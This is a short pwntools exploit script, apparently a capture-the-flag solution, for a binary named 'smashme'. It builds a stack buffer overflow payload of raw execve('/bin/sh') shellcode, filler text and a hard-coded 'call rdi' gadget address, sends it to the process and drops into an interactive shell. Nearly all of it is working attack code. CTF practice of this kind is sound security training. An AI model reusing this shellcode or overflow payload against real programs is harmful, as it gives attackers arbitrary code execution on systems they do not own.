#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./smashme')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

# padding = cyclic(64)

io.recvuntil("smash?")

shellcode = "\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # asm(shellcraft.sh())
print("shellcode len is {}".format(len(shellcode)))
print("len of BBBB is {}".format(len("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")))
padding = shellcode # "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
padding += "Smash me outside, how bout dAAAAAAAAAAA"
# padding += p64(hex(next(exe.search(asm("call rdi"))))) # rdi address because ASLR is enabled
padding += p64(0x403582) # rdi address because ASLR is enabled
io.send(padding + shellcode)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

